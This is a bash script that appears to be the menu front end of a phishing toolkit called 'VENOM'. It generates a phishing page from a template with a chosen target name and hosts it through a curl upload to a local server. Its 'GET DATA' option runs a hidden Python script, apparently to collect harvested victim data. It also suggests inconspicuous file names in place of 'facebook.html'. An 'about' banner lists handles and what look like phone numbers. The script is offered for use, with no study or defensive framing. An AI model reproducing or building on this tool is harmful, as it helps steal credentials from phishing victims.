#!/bin/bash

# system cleaner
clear

# Import colors
red="\033[1;31m"
green="\033[1;32m"
yelo="\033[1;33m"

# about
about(){
echo " ================================"
echo -e " ╔══════╦══════╦═══════════╦════════╗"
echo -e " ║ NAME ║ TEAM ║  CONTACT  ║ COUNTRY║"
echo -e " ╠══════╬══════╬═══════════╬════════╝"
echo -e " ║DANGER║ TRUE ║ 0847611848║   RSA"
echo -e " ╠══════╬══════╬═══════════╣"
echo -e " ║  TD  ║ TRUE ║ 0780478735║   RSA"
echo -e " ╠══════╬══════╬═══════════╣"
echo -e " ║ REEX ║ TRUE ║ 8124839217║   NGA"
echo -e " ╠══════╬══════╬═══════════╣"
echo -e " ║ JUNI ║ TRUE ║ 8124839217║   UGA"
echo -e " ╚══════╩══════╩═══════════╝"
echo -e " ================================"

}

pyread(){
python do_not_view.py
}

# home setings
home(){
echo -e " ${red}[${yelo}5${red}] ${green}HOME          ${red}[${yelo}0${red}] ${green}EXIT"
reader
if [[ "$choice" == "5" ]];
then
loader
logo
opt
reader
rule
elif [[ "$choice" == "0" ]];
then
echo "     THANK YOU FOR USING THIS TOOL !"
else
echo "    OPTION NOT RECOGNISED"
logo
home
fi
}


# ctrl rule
ctrl(){
echo
echo
echo -e "  ${yelo} CTRL + C PRESSED!"
echo
echo
sleep 1.4
exit 2
}
trap ctrl SIGINT

# options
opt(){
echo -e " ==================================="
echo -e " ${red}[${yelo}1${red}] ${green}GENERATE PHISH   ${red}[${yelo}2${red}] ${green}HOST PHISH"
echo -e " ${red}[${yelo}3${red}] ${green}GET DATA         ${red}[${yelo}4${red}] ${green}ABOUT US"
echo -e " ${red}[${yelo}5${red}] ${green}CONTACT          ${red}[${yelo}0${red}] ${green}EXIT"
}

rule(){
if [[ "$choice" == "1" ]];
then
loader
generate
elif [[ "$choice" == "2" ]];
then
loader
upload
elif [[ "$choice" == "3" ]];
then
loader
logo
pyread
py "$tag"
elif [[ "$choice" == "4" ]];
then
loader
about
home
elif [[ "$choice" == "5" ]];
then
loader
contact
home
elif [[ "$choice" == "td" || "$choice" == "danger" ]];
then
logo
crf
elif [[ "$choice" == "0" || "$choice" == "exit" || "$choice" == "00" ]];
then
echo
echo "   THANK YOU FOR USING THIS TOOL"
echo
sleep 1.5
exit
else
echo -e " [×] ${red} UNRECOGNISED CHOICE"
sleep 1.5
bash start.sh
fi
}

# reader
reader(){
echo
echo -e " ==================================="
read -p " CHOICE |+> " choice
}

# logo
logo(){
clear
echo
sleep 2
echo -e "${green}╔═══════════╦═══════════════════════╗"
echo -e "${green}║ (  \  /  )║ ${yelo}DEVELOPER \033[1;0m: ${red}HACK-HIVE ${green}║"
echo -e "${green}║   (@  @)  ║ ${yelo}TOOL NAME \033[1;0m: ${red}VENOM ${green}    ║"
echo -e "${green}║    \  /   ║ ${yelo}VERSION   \033[1;0m: ${red}V1.0  ${green}    ║"
echo -e "${green}║    ('')   ║ ${yelo}DONATE    \033[1;0m: ${red}5.00USD ${green}  ║"
echo -e "${green}╚═══════════╩═══════════════════════╝"
echo
}

# loading to prevent crash
loader(){
echo
echo
echo
tput civis
echo -ne '...\r'
for i in {1..10}; do
    echo -e -ne "           ${red}█"
    for j in {1..10}; do
        if [[ $j -le $i ]]; then
            echo -ne '█'
        else
            echo -e -ne "${green}▒"
        fi
    done
    echo -e -ne "${green} $((i*10))%\r"
    sleep 0.2
done
echo
echo
clear
}

# generate phish
generate(){

echo -e "${yelo} [+] ${green}ENTER FETCH NAME"
sleep 1.3
echo -e "         ${red}  OR"
sleep 1.1
echo -e "${yelo} [/]${green} TARGET NAME \033[2;0m"
echo
sleep 2
read -p " [?] NAME : " name
if [[ "$name" == "" ]];
then
echo -e "NAME IS REQUIRED"
else
echo -e " ${green}  REMEMBER TO USE${red} $name ${green}WHEN RETRIEVING TARGET(s)"
echo -e ""
echo -e " ${yelo}[${green}+${yelo}] ${green}GENERATING YOUR PHISH ..."
loader
cp filez/index.html .
sed -i "s/\$name/$name/g" index.html
echo -e " ${green}     [+] Done"
sleep 3
clear
fi
echo
echo -e "${yelo} [+] FILE NEED A NAME ! eg. fbk.html"
read -p "      FILE NAME : " fname
if [[ "$fname" == "fb.html" || "$fname" == "fb.php" || "$fname" == "facebook.html" || "$fname" == "facebook.php" ]];
then
echo -e ""
echo -e "${red} SERVER RESTRICT${yelo} USE ${green}$name.html INSTEAD"
echo
read -p "      FILE NAME : " fname
echo
echo "    RENAMING FILE"
fi
mv index.html "$fname"
echo -e "${green}FILE  RENAMED SUCCESSFUL AT @$fname"
sleep 2
clear
echo -e "${red}[${yelo}?${red}] ${green}WOULD YOU LIKE TO GO BACK HOME ?"
read home
if [[ "$home" == "y" || "$home" == "yes" || "$home" == "" ]];
then
echo
echo -e " ${green}    TAKING YOU HOME 😉"
sleep 1.3
bash start.sh
else
echo
echo -e "${red} HOPE TO SEE YOU SOON 💔😢"
exit 1
fi
}

# file upload
upload(){
echo -e "${red} [+] ${green}FILE TO UPLOAD \033[3;0m"
read -p "    |=> " filepath
upload_url="http://127.0.0.1:8080/post.php"
site="http://127.0.0.1:8080"
response=$(curl -s -F "file=@$filepath" "$upload_url")

if [[ $response == "File uploaded successfully." ]]; then
    echo -e "${red} [+] ${yelo}SUCCESS : ${green}$response"
    echo -e "\n ${red}$site/$filepath"
    sleep 12
    bash start.sh
else
    echo -e "${green} [×] ${yelo}ERROR :${red} $response"
echo
sleep 5
bash start.sh
fi

}


logo
loader
logo
opt
reader
rule
